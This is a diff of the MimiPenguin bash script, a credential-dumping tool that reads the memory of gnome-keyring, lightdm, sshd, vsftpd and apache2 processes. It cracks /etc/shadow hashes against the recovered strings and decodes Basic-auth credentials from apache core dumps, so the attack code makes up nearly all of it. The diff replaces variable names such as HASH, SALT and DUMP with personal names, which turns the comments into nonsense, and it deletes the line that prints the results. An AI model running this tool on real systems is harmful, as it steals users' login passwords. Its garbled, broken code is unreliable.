@@ -16,7 +16,6 @@ export RESULTS=""
 
 # check if a command exists in $PATH
 command_exists () {
-
   command -v "${1}" >/dev/null 2>&1
 }
 
@@ -48,7 +47,6 @@ fi
 
 # $1 = PID, $2 = output_file, $3 = operating system
 function dump_pid () {
-
     system=$3
     pid=$1
     output_file=$2
@@ -68,19 +66,16 @@ function dump_pid () {
     done <<< "$mem_maps"
 }
 
-
-
-# $1 = DUMP, $2 = HASH, $3 = SALT, $4 = SOURCE
+# $1 = Devesh, $2 = Manju, $3 = Suhas, $4 = SOURCE
 function parse_pass () {
-
-    #If hash not in dump get shadow hashes
+    #If Manju not in Devesh get shadow Manjus
     if [[ ! "$2" ]]; then
-            SHADOWHASHES="$(cut -d':' -f 2 /etc/shadow | grep -E '^\$.\$')"
+            SHADOWMANJUS="$(cut -d':' -f 2 /etc/shadow | grep -E '^\$.\$')"
     fi
 
     #Determine password potential for each word
     while read -r line; do
-        #If hash in dump, prepare crypt line
+        #If Manju in Devesh, prepare crypt line
         if [[ "$2" ]]; then
             #get ctype
             CTYPE="$(echo "$2" | cut -c-3)"
@@ -92,21 +87,21 @@ function parse_pass () {
                 USER="$(grep "${2}" /etc/shadow | cut -d':' -f 1)"
                 export RESULTS="$RESULTS$4          $USER:$line \n"
             fi
-        #Else use shadow hashes
-        elif [[ $SHADOWHASHES ]]; then
-            while read -r thishash; do
-                CTYPE="$(echo "$thishash" | cut -c-3)"
-                SHADOWSALT="$(echo "$thishash" | cut -d'$' -f 3)"
+        #Else use shadow Manjus
+        elif [[ $SHADOWMANJUS ]]; then
+            while read -r thisManju; do
+                CTYPE="$(echo "$thisManju" | cut -c-3)"
+                SHADOWSUHAS="$(echo "$thisManju" | cut -d'$' -f 3)"
                 #Escape quotes, backslashes, single quotes to pass into crypt
                 SAFE=$(echo "$line" | sed 's/\\/\\\\/g; s/\"/\\"/g; s/'"'"'/\\'"'"'/g;')
-                CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSALT\""
-                if [[ $($pycmd -c "from __future__ import print_function; import crypt; print(crypt.crypt($CRYPT))") == "$thishash" ]]; then
+                CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSUHAS\""
+                if [[ $($pycmd -c "from __future__ import print_function; import crypt; print(crypt.crypt($CRYPT))") == "$thisManju" ]]; then
                     #Find which user's password it is (useful if used more than once!)
-                    USER="$(grep "${thishash}" /etc/shadow | cut -d':' -f 1)"
+                    USER="$(grep "${thisManju}" /etc/shadow | cut -d':' -f 1)"
                     export RESULTS="$RESULTS$4          $USER:$line\n"
                 fi
-            done <<< "$SHADOWHASHES"
-        #if no hash data - revert to checking probability
+            done <<< "$SHADOWMANJUS"
+        #if no Manju data - revert to checking probability
         else
         patterns=("^_pammodutil.+[0-9]$"\
                  "^LOGNAME="\
@@ -129,8 +124,7 @@ function parse_pass () {
         done
         fi
     done <<< "$1"
-} # end parse_pass
-
+}
 
 #Support Kali
 if [[ $(uname -a | awk '{print tolower($0)}') == *"kali"* ]]; then
@@ -140,24 +134,23 @@ if [[ $(uname -a | awk '{print tolower($0)}') == *"kali"* ]]; then
     #if exists aka someone logged into gnome then extract...
     if [[ $PID ]];then
         while read -r pid; do
-            dump_pid "$pid" /tmp/dump "kali"
-            HASH="$(strings "/tmp/dump.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
-            SALT="$(echo "$HASH" | cut -d'$' -f 3)"
-            DUMP="$(strings "/tmp/dump.${pid}" | grep -E '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
-            DUMP="${DUMP}$(strings "/tmp/dump.${pid}" | grep -E '^gkr_system_authtok$' -B 5 -A 5)"
+            dump_pid "$pid" /tmp/Devesh "kali"
+            Manju="$(strings "/tmp/Devesh.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
+            Suhas="$(echo "$Manju" | cut -d'$' -f 3)"
+            Devesh="$(strings "/tmp/Devesh.${pid}" | grep -E '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
+            Devesh="${Devesh}$(strings "/tmp/Devesh.${pid}" | grep -E '^gkr_system_authtok$' -B 5 -A 5)"
             #Remove dupes to speed up processing
-            DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
-            parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
+            Devesh=$(echo "$Devesh" | tr " " "\n" |sort -u)
+            parse_pass "$Devesh" "$Manju" "$Suhas" "$SOURCE" 
     
             #cleanup
-            rm -rf "/tmp/dump.${pid}"
+            rm -rf "/tmp/Devesh.${pid}"
         done <<< "$PID"
     fi
 fi
 
 #Support gnome-keyring
 if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep gnome-keyring) ]]; then
-
         SOURCE="[SYSTEM - GNOME]"
         #get /usr/bin/gnome-keyring-daemon process
         PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk -F ' ' '{ print $1 }')"
@@ -165,16 +158,16 @@ if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep gnome-keyring) ]]; then
     #if exists aka someone logged into gnome then extract...
     if [[ $PID ]];then
         while read -r pid; do
-            dump_pid "$pid" /tmp/dump
-            HASH="$(strings "/tmp/dump.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
-            SALT="$(echo "$HASH" | cut -d'$' -f 3)"
-            DUMP=$(strings "/tmp/dump.${pid}" | grep -E '^.+libgck\-1\.so\.0$' -B 10 -A 10)
-            DUMP+=$(strings "/tmp/dump.${pid}" | grep -E -A 5 -B 5 'libgcrypt\.so\..+$')
+            dump_pid "$pid" /tmp/Devesh
+            Manju="$(strings "/tmp/Devesh.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
+            Suhas="$(echo "$Manju" | cut -d'$' -f 3)"
+            Devesh=$(strings "/tmp/Devesh.${pid}" | grep -E '^.+libgck\-1\.so\.0$' -B 10 -A 10)
+            Devesh+=$(strings "/tmp/Devesh.${pid}" | grep -E -A 5 -B 5 'libgcrypt\.so\..+$')
             #Remove dupes to speed up processing
-            DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
-            parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE" 
+            Devesh=$(echo "$Devesh" | tr " " "\n" |sort -u)
+            parse_pass "$Devesh" "$Manju" "$Suhas" "$SOURCE" 
             #cleanup
-            rm -rf "/tmp/dump.${pid}"
+            rm -rf "/tmp/Devesh.${pid}"
         done <<< "$PID"
     fi
 fi
@@ -187,15 +180,15 @@ if [[ -n $(ps -eo pid,command | grep -v 'grep' | grep lightdm | grep session-chi
     #if exists aka someone logged into lightdm then extract...
     if [[ $PID ]]; then
         while read -r pid; do
-            dump_pid "$pid" /tmp/dump
-            HASH=$(strings "/tmp/dump.${pid}" | grep -E -m 1 '^\$.\$.+\$')
-            SALT="$(echo "$HASH" | cut -d'$' -f 3)"
-            DUMP="$(strings "/tmp/dump.${pid}" | grep -E '^_pammodutil_getspnam_' -A1)"
+            dump_pid "$pid" /tmp/Devesh
+            Manju=$(strings "/tmp/Devesh.${pid}" | grep -E -m 1 '^\$.\$.+\$')
+            Suhas="$(echo "$Manju" | cut -d'$' -f 3)"
+            Devesh="$(strings "/tmp/Devesh.${pid}" | grep -E '^_pammodutil_getspnam_' -A1)"
             #Remove dupes to speed up processing
-            DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
-            parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
+            Devesh=$(echo "$Devesh" | tr " " "\n" |sort -u)
+            parse_pass "$Devesh" "$Manju" "$Suhas" "$SOURCE"
             #cleanup
-            rm -rf "/tmp/dump.${pid}"
+            rm -rf "/tmp/Devesh.${pid}"
         done <<< "$PID"
     fi
 fi
@@ -209,12 +202,12 @@ if [[ -e "/etc/vsftpd.conf" ]]; then
     if [[ $PID ]];then
         while read -r pid; do
             dump_pid "$pid" /tmp/vsftpd
-            HASH="$(strings "/tmp/vsftpd.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
-            SALT="$(echo "$HASH" | cut -d'$' -f 3)"
-            DUMP=$(strings "/tmp/vsftpd.${pid}" | grep -E -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
+            Manju="$(strings "/tmp/vsftpd.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
+            Suhas="$(echo "$Manju" | cut -d'$' -f 3)"
+            Devesh=$(strings "/tmp/vsftpd.${pid}" | grep -E -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
             #Remove dupes to speed up processing
-            DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
-            parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
+            Devesh=$(echo "$Devesh" | tr " " "\n" |sort -u)
+            parse_pass "$Devesh" "$Manju" "$Suhas" "$SOURCE"
         done <<< "$PID"
 
         #cleanup
@@ -229,21 +222,21 @@ if [[ -e "/etc/apache2/apache2.conf" ]]; then
         PID="$(ps -eo pid,user,command | grep apache2 | grep -v 'grep' | awk -F ' ' '{ print $1 }')"
     #if exists aka apache2 running
     if [[ "$PID" ]];then
-        #Dump all workers
+        #Devesh all workers
         while read -r pid; do
             gcore -o /tmp/apache "$pid" > /dev/null 2>&1
             #without gcore - VERY SLOW!
             #dump_pid $pid /tmp/apache
         done <<< "$PID"
         #Get encoded creds
-        DUMP="$(strings /tmp/apache* | grep -E '^Authorization: Basic.+=$' | cut -d' ' -f 3)"
+        Devesh="$(strings /tmp/apache* | grep -E '^Authorization: Basic.+=$' | cut -d' ' -f 3)"
         #for each extracted b64 - decode the cleartext
         while read -r encoded; do
             CREDS="$(echo "$encoded" | base64 -d)"
             if [[ "$CREDS" ]]; then
                 export RESULTS="$RESULTS$SOURCE         $CREDS\n"
             fi
-        done <<< "$DUMP"
+        done <<< "$Devesh"
         #cleanup
         rm -rf /tmp/apache*
     fi
@@ -254,16 +247,16 @@ if [[ -e "/etc/ssh/sshd_config" ]]; then
     SOURCE="[SYSTEM - SSH]"
     #get all ssh tty/pts sessions - sshd: user@pts01
     PID="$(ps -eo pid,command | grep -E 'sshd:.+@' | grep -v 'grep' | awk -F ' ' '{ print $1 }')"
-    #if exists aka someone logged into SSH then dump
+    #if exists aka someone logged into SSH then Devesh
     if [[ "$PID" ]];then
         while read -r pid; do
             dump_pid "$pid" /tmp/sshd
-            HASH="$(strings "/tmp/sshd.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
-            SALT="$(echo "$HASH" | cut -d'$' -f 3)"
-            DUMP=$(strings "/tmp/sshd.${pid}" | grep -E -A 3 '^sudo.+')
+            Manju="$(strings "/tmp/sshd.${pid}" | grep -E -m 1 '^\$.\$.+\$')"
+            Suhas="$(echo "$Manju" | cut -d'$' -f 3)"
+            Devesh=$(strings "/tmp/sshd.${pid}" | grep -E -A 3 '^sudo.+')
             #Remove dupes to speed up processing
-            DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
-            parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
+            Devesh=$(echo "$Devesh" | tr " " "\n" |sort -u)
+            parse_pass "$Devesh" "$Manju" "$Suhas" "$SOURCE"
         done <<< "$PID"
         #cleanup
         rm -rf /tmp/sshd.*
@@ -272,5 +265,3 @@ fi
 
 #Output results to STDOUT
 printf "MimiPenguin Results:\n"
-printf "%b" "$RESULTS" | sort -u
-unset RESULTS
